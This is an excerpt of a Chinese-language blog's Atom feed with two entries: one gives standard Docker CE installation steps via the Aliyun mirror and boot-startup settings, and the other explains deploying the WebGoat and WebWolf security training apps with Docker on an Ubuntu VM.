    <summary type="html">&lt;h1 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get update&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get -y install apt-transport-https ca-certificates curl software-properties-common&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# step 2: 安装GPG证书&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;curl -fsSL http:&amp;#x2F;&amp;#x2F;mirrors.aliyun.com&amp;#x2F;docker-ce&amp;#x2F;linux&amp;#x2F;ubuntu&amp;#x2F;gpg | sudo apt-key add -&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# Step 3: 写入软件源信息&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo add-apt-repository &amp;quot;deb [arch&amp;#x3D;amd64] http:&amp;#x2F;&amp;#x2F;mirrors.aliyun.com&amp;#x2F;docker-ce&amp;#x2F;linux&amp;#x2F;ubuntu $(lsb_release -cs) stable&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# Step 4: 更新并安装Docker-CE&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get -y update&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get -y install docker-ce&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;#设置开机自启&lt;/p&gt;
&lt;h3 id=&quot;docker开机自启：sudo-systemctl-enable-docker-service&quot;&gt;&lt;a href=&quot;#docker开机自启：sudo-systemctl-enable-docker-service&quot; class=&quot;headerlink&quot; title=&quot;docker开机自启：sudo systemctl enable docker.service&quot;&gt;&lt;/a&gt;docker开机自启：sudo systemctl enable docker.service&lt;/h3&gt;&lt;h3 id=&quot;容器开机自启：启动容器时加上-–restart-always&quot;&gt;&lt;a href=&quot;#容器开机自启：启动容器时加上-–restart-always&quot; class=&quot;headerlink&quot; title=&quot;容器开机自启：启动容器时加上 –restart=always&quot;&gt;&lt;/a&gt;容器开机自启：启动容器时加上 –restart=always&lt;/h3&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Docker搭建webgoat</title>
    <link href="http://example.com/2020/10/12/Docker%E6%90%AD%E5%BB%BAwebgoat/"/>
    <id>http://example.com/2020/10/12/Docker%E6%90%AD%E5%BB%BAwebgoat/</id>
    <published>2020-10-12T04:35:16.000Z</published>
    <updated>2020-12-22T11:45:25.720Z</updated>
    
    <content type="html"><![CDATA[<h3 id="虚拟机：Ubuntu18-服务器版"><a href="#虚拟机：Ubuntu18-服务器版" class="headerlink" title="虚拟机：Ubuntu18 服务器版"></a>虚拟机：Ubuntu18 服务器版</h3><a id="more"></a><h3 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h3><ol><li>在虚拟机上安装docker；</li><li><code>$ sudo docker search webgoat</code> 查找webgoat镜像；</li><li><code>$ sudo docker pull webgoat/webgoat-8.0</code> 拉取镜像；</li><li><code>$ sudo docker run -dt --name webgoat -p 8080:8080 --rm webgoat/webgoat-8.0</code> 开启镜像服务；</li><li>使用浏览器访问：ip:8080/WebGoat 即可；</li><li>自己创建账户登录，即可使用，全英文界面可能对和我一样的英语白痴来说不太友好；</li></ol><blockquote><p>网上看到一些其他的开启镜像的方法，我使用的时候一直卡着启动不了。</p></blockquote><h3 id="联合搭建webgoat与webwolf"><a href="#联合搭建webgoat与webwolf" class="headerlink" title="联合搭建webgoat与webwolf"></a>联合搭建webgoat与webwolf</h3><ol><li><p>使用docker拉取镜像：<code>sudo docker pull webgoat/goatandwolf</code></p></li><li><p>启动镜像：<code>sudo docker run -d -p 8081:8080 -p 9090:9090 -e TZ=Europe/Amsterdam webgoat/goatandwolf </code></p><blockquote><p>可能会出现浏览器兼容问题</p></blockquote></li></ol>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;虚拟机：Ubuntu18-服务器版&quot;&gt;&lt;a href=&quot;#虚拟机：Ubuntu18-服务器版&quot; class=&quot;headerlink&quot; title=&quot;虚拟机：Ubuntu18 服务器版&quot;&gt;&lt;/a&gt;虚拟机：Ubuntu18 服务器版&lt;/h3&gt;</summary>
    
    
    
    
    <category term="Docker" scheme="http://example.com/tags/Docker/"/>
    
  </entry>
  
</feed>
